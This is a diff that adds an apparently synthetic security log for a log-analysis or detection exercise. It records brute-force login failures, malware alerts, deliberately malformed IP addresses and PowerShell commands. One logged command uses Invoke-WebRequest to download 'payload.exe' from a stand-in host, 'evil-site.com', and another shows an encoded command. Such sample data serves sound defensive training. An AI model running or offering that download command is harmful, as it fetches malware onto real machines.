@@ -1,0 +1,39 @@
+2026-06-23 09:00:01 INFO User john logged in from 192.168.1.10
+2026-06-23 09:01:15 INFO User alice logged in from 10.10.10.15
+2026-06-23 09:02:30 ERROR Failed login for admin from 203.0.113.5
+2026-06-23 09:02:45 ERROR Failed login for admin from 203.0.113.5
+2026-06-23 09:03:02 ERROR Failed login for admin from 203.0.113.5
+2026-06-23 09:03:18 ERROR Failed login for admin from 203.0.113.5
+2026-06-23 09:03:35 ERROR Failed login for admin from 203.0.113.5
+2026-06-23 09:03:50 ERROR Failed login for admin from 203.0.113.5
+2026-06-23 09:04:05 ERROR Failed login for admin from 203.0.113.5
+2222.2222.2222.2222 is a wrong ip
+2026-06-23 09:05:12 INFO File opened by john
+2026-06-23 09:06:00 ALERT Malware detected on HOST-01
+2026-06-23 09:06:15 INFO Connection established from 8.8.8.8
+2026-06-23 09:07:30 INFO Connection established from 1.2.3.4
+2026-06-23 09:08:01 INFO User david logged in from 172.16.1.20
+
+2026-06-23 09:09:44 WARNING PowerShell Command: Get-Process
+2026-06-23 09:10:12 WARNING PowerShell Command: Invoke-WebRequest http://evil-site.com/payload.exe
+2026-06-23 09:10:40 WARNING PowerShell Command: EncodedCommand SQBFAFgA
+
+2026-06-23 09:11:15 INFO Connection established from 185.220.101.1
+2026-06-23 09:12:00 INFO User root logged in from 192.168.1.15
+
+2026-06-23 09:13:10 ERROR Failed login for root from 45.33.32.1
+2026-06-23 09:13:22 ERROR Failed login for root from 45.33.32.1
+2026-06-23 09:13:35 ERROR Failed login for root from 45.33.32.1
+
+2026-06-23 09:14:10 ALERT Malware detected on HOST-02
+2026-06-23 09:15:20 INFO Connection established from 10.0.0.5
+2026-06-23 09:16:45 INFO User mike logged in from 172.16.5.100
+2026-06-23 09:17:05 WARNING PowerShell Command: Get-Service
+2026-06-23 09:18:10 INFO Connection established from 192.168.100.20
+
+2026-06-23 09:19:01 ERROR Failed login for administrator from 203.0.113.5
+2026-06-23 09:19:15 ERROR Failed login for administrator from 203.0.113.5
+
+2026-06-23 09:20:30 ALERT Malware detected on HOST-03
+2026-06-23 09:21:10 INFO User sarah logged in from 192.168.1.55
+2026-06-23 09:21:10 INFO User sarah logged in from 192.1682.1.552
